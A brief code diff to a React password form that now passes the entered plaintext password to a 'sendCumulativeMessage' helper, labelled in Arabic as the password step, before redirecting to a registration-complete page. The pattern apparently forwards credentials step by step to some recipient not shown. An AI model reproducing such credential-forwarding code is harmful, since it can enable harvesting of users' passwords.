@@ -41,8 +41,9 @@ const PasswordForm = () => {
       return;
     }
 
-    updateData({ password });
-    await sendCumulativeMessage(3, "كلمة المرور");
+    const newData = { password };
+    updateData(newData);
+    await sendCumulativeMessage(3, "كلمة المرور", newData);
     navigate("/registration-complete");
   };
 
